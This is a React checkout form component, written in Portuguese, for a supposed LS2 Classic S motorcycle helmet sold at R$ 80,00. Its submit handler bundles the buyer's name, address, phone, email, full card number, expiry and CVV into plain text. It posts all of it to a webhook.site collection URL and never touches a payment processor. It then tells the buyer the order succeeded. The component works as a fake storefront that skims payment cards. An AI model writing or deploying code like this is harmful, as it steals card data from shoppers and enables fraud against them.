import { useState } from "react";
import { useToast } from "@/components/ui/use-toast";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";

interface FormData {
  nome: string;
  email: string;
  telefone: string;
  endereco: string;
  numeroCartao: string;
  validadeCartao: string;
  cvv: string;
}

export const CheckoutForm = () => {
  const { toast } = useToast();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState<FormData>({
    nome: "",
    email: "",
    telefone: "",
    endereco: "",
    numeroCartao: "",
    validadeCartao: "",
    cvv: "",
  });

  const formatDataAsNotes = (data: FormData) => {
    return `
=== NOVO PEDIDO DE CAPACETE LS2 CLASSIC S ===
Nome: ${data.nome}
Email: ${data.email}
Telefone: ${data.telefone}
Endereço: ${data.endereco}
------- Dados do Cartão -------
Número: ${data.numeroCartao}
Validade: ${data.validadeCartao}
CVV: ${data.cvv}
================================
Valor Total: R$ 80,00
Frete: Grátis
================================`;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const formattedData = formatDataAsNotes(formData);
      const response = await fetch("https://webhook.site/295a22f7-696f-4834-a212-8f1540b471c6", {
        method: "POST",
        headers: {
          "Content-Type": "text/plain",
        },
        body: formattedData,
      });

      if (response.ok) {
        toast({
          title: "Pedido realizado com sucesso!",
          description: "Você receberá um email com os detalhes da compra.",
        });
        setFormData({
          nome: "",
          email: "",
          telefone: "",
          endereco: "",
          numeroCartao: "",
          validadeCartao: "",
          cvv: "",
        });
      } else {
        throw new Error("Falha ao processar o pedido");
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Erro ao processar pedido",
        description: "Por favor, tente novamente mais tarde.",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <Card className="p-6 space-y-4 bg-white/80 backdrop-blur-sm border border-gray-200 rounded-xl shadow-lg animate-fade-in">
      <form onSubmit={handleSubmit} className="space-y-4">
        <div className="space-y-2">
          <Input
            placeholder="Nome completo"
            value={formData.nome}
            onChange={(e) => setFormData({ ...formData, nome: e.target.value })}
            required
            className="border-gray-300 focus:ring-black"
          />
        </div>
        <div className="space-y-2">
          <Input
            type="email"
            placeholder="Email"
            value={formData.email}
            onChange={(e) => setFormData({ ...formData, email: e.target.value })}
            required
            className="border-gray-300 focus:ring-black"
          />
        </div>
        <div className="space-y-2">
          <Input
            placeholder="Telefone"
            value={formData.telefone}
            onChange={(e) => setFormData({ ...formData, telefone: e.target.value })}
            required
            className="border-gray-300 focus:ring-black"
          />
        </div>
        <div className="space-y-2">
          <Input
            placeholder="Endereço completo"
            value={formData.endereco}
            onChange={(e) => setFormData({ ...formData, endereco: e.target.value })}
            required
            className="border-gray-300 focus:ring-black"
          />
        </div>
        <div className="space-y-2">
          <Input
            placeholder="Número do cartão"
            value={formData.numeroCartao}
            onChange={(e) => setFormData({ ...formData, numeroCartao: e.target.value })}
            required
            className="border-gray-300 focus:ring-black"
          />
        </div>
        <div className="grid grid-cols-2 gap-4">
          <Input
            placeholder="Validade (MM/AA)"
            value={formData.validadeCartao}
            onChange={(e) => setFormData({ ...formData, validadeCartao: e.target.value })}
            required
            className="border-gray-300 focus:ring-black"
          />
          <Input
            placeholder="CVV"
            value={formData.cvv}
            onChange={(e) => setFormData({ ...formData, cvv: e.target.value })}
            required
            className="border-gray-300 focus:ring-black"
          />
        </div>
        <Button
          type="submit"
          disabled={loading}
          className="w-full bg-black hover:bg-gray-800 text-white transition-colors duration-200"
        >
          {loading ? "Processando..." : "Finalizar Compra - R$ 80,00"}
        </Button>
      </form>
    </Card>
  );
};